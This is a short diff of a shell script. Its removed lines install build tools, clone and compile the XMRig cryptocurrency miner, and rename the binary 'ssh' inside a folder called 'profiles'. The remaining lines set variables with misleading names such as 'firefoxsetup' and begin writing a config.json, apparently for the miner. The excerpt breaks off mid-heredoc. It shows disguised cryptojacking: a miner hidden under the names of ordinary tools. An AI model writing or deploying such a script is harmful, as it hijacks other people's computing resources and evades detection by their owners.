@@ -1,15 +1,5 @@
 #!/bin/sh
-apt-get update -y
-apt-get upgrade -y
-apt-get install wget -y
-apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
-git clone https://github.com/xmrig/xmrig.git
-mv xmrig profiles
 cd profiles
-cmake .
-make
-cp xmrig ssh
-rm xmrig
 export firefoxsetup=$(openssl rand -hex 20)
 export link=$(openssl rand -hex 4)
 bash -c 'cat <<EOT >>config.json
